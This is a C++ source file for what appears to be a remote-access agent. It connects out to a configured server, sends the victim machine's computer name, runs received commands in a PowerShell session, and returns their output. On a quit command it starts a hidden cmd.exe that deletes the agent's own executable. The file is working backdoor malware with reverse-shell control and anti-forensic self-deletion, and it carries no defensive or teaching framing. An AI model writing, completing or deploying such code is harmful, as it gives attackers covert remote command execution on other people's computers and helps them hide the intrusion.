#include "PowerShellSession.hpp"

VOID SelfDelete() {
    CHAR carrSelfPath[MAX_PATH];
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    GetModuleFileNameA(NULL, carrSelfPath, MAX_PATH);
    std::string szCmdLine = "cmd.exe /C timeout /t 1 >nul & del \"" + std::string(carrSelfPath) + "\"";
    CreateProcessA(NULL, (LPSTR)szCmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


VOID PrependStringSize(std::wstring wszData, std::wstring& wszOutput) {
    uint32_t uiNetMessageLen;

    uiNetMessageLen = htonl(wszData.size() * sizeof(WCHAR));
    wszOutput = std::wstring(reinterpret_cast<WCHAR*>(&uiNetMessageLen), sizeof(uint32_t) / sizeof(WCHAR));
    wszOutput += wszData;
}


VOID SendComputerName(SOCKET sock) {
    WCHAR wcarrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD dwComputerNameLength;
    std::wstring wszComputerName;
    std::wstring wszFinalComputerName;

    dwComputerNameLength = sizeof(wcarrComputerName);

    if (!GetComputerNameW(wcarrComputerName, &dwComputerNameLength)) {
        std::cerr << "GetComputerNameA failed! Error: " << GetLastError() << std::endl;
        return;

    }

    wszComputerName.append(wcarrComputerName, dwComputerNameLength);
    PrependStringSize(wszComputerName, wszFinalComputerName);
    send(sock, reinterpret_cast<const CHAR*>(wszFinalComputerName.data()), wszFinalComputerName.length() * sizeof(WCHAR), 0);
}

VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
    INT iBytesReceived;
    BOOL bIsRunning;
    WCHAR wcarrRecvbuf[MAX_BUFFER_SIZE];
    std::string szCwd;
    std::string szCommandOutput;
    std::wstring wszFinalData;

    bIsRunning = TRUE;

    while (bIsRunning) {
        iBytesReceived = recv(socket, reinterpret_cast<CHAR*>(wcarrRecvbuf), sizeof(wcarrRecvbuf) - sizeof(WCHAR), 0);

        if (iBytesReceived < 0) {
            break;
        }

        wcarrRecvbuf[iBytesReceived / sizeof(WCHAR)] = '\0';
        std::string szCommand = WstringToString(wcarrRecvbuf);

        if (szCommand == WstringToString(QUIT_COMMAND)) {
            bIsRunning = FALSE;
            SelfDelete();
        }
        else {
            szCommandOutput = psSession.RunCommand(szCommand);
            PrependStringSize(StringToWstring(szCommandOutput), wszFinalData);
            send(socket, reinterpret_cast<const CHAR*>(wszFinalData.data()), wszFinalData.length() * sizeof(WCHAR), 0);
        }
    }
}


INT main() {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    sockaddr_in serverAddr = {};
    PowerShellSession psSession;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(AGENT_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) != 1) {
        std::cerr << "Invalid IP address\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[+] Connected to server " << SERVER_IP << ":" << AGENT_PORT << "\n";

    SendComputerName(sock);
    CommandListenerLoop(sock, psSession);
    closesocket(sock);
    WSACleanup();
    return 0;
}